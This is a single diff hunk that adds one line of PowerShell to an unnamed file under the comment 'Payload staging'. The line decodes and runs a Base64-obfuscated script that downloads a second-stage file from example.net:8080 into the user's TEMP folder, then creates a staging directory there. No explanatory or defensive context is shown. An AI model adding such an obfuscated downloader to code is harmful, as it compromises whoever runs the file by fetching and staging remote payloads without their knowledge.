@@ -1,0 +1,1 @@
+<# Payload staging #> [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("JFN0YWdlMlVybCA9ICJodHRwOi8vZXhhbXBsZS5uZXQ6ODA4MC91cGRhdGUuZGF0IjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkU3RhZ2UyVXJsIC1PdXRGaWxlICIkZW52OlRFTVBcc3RhZ2UyLmJpbiIgLVVzZUJhc2ljUGFyc2luZw=="))).Invoke(); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
